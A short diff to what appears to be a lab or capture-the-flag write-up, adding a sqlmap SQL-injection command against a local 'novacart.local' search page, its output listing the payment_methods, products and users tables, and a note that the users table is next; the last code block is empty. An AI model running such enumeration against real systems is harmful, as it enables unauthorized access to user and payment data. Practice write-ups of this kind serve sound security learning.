@@ -218,4 +218,21 @@ available databases [4]:
 [*] tempdb
 ```
 
-Ill start by targeting the `NovaCart` db
+Ill start by targeting the `NovaCart` DB
+
+```python
+sqlmap -u http://novacart.local/search.aspx?q=graphics --batch --flush-session --dbs --risk 3 --level 5 -D NovaCart --tables
+
+Database: NovaCart
+[3 tables]
++-----------------+
+| payment_methods |
+| products        |
+| users           |
++-----------------+
+```
+Ill select the users table
+
+```python
+
+```
